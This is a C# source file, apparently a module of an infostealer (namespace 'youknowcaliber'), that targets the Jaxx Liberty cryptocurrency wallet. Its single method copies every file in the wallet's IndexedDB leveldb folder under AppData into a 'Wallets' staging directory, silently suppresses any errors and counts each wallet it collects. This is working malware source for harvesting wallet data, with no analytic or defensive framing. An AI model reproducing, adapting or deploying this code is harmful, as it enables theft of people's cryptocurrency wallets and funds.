﻿using System;
using System.IO;

namespace youknowcaliber
{
	internal class Jaxx
	{
		public static void JaxxStr(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\").GetFiles())
				{
					Directory.CreateDirectory(directorypath + Jaxx.JaxxDir);
					fileInfo.CopyTo(directorypath + Jaxx.JaxxDir + fileInfo.Name);
				}
				Jaxx.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		public static int count = 0;

		public static string JaxxDir = "\\Wallets\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\";
	}
}
